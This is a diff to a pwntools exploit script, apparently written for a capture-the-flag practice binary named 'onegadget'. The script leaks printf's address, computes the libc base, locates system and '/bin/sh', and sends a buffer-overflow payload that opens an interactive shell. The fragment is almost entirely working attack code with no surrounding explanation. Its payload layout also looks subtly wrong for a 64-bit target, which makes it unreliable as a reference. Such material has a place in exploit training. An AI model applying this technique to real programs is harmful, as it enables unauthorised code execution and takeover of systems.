@@ -32,34 +32,28 @@ from pwn import *
 
 p = process('./onegadget')
 e = ELF('./onegadget')
-
-binsh = 0x68732f6e6962
+libc = e.libc
 
 p.recvuntil(b'printf Function is at: ')
 printf_addr = int(p.recv(14), 16)
 
-libc_base = printf_addr - e.symbols['printf']
-
+libc_base = printf_addr - libc.symbols['printf']
+system_addr = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
 
 log.info("libc base : %s"%hex(libc_base))
-system_addr = libc_base + e.symbols['system']
-
 log.info("system addr : %s"%hex(system_addr))
 
-binsh = libc_base + list(e.search('/bin/sh'))[0]
-
-
-
-
 payload = b'A'*0x20
-payload += b'B'*0x4
+payload += b'B'*0x8
 payload += p64(system_addr)
-payload += b'C'*0x4
+payload += b'C'*0x8
 payload += p64(binsh)
 
 p.sendline(payload)
 
 p.interactive()
+
 
 ```
 
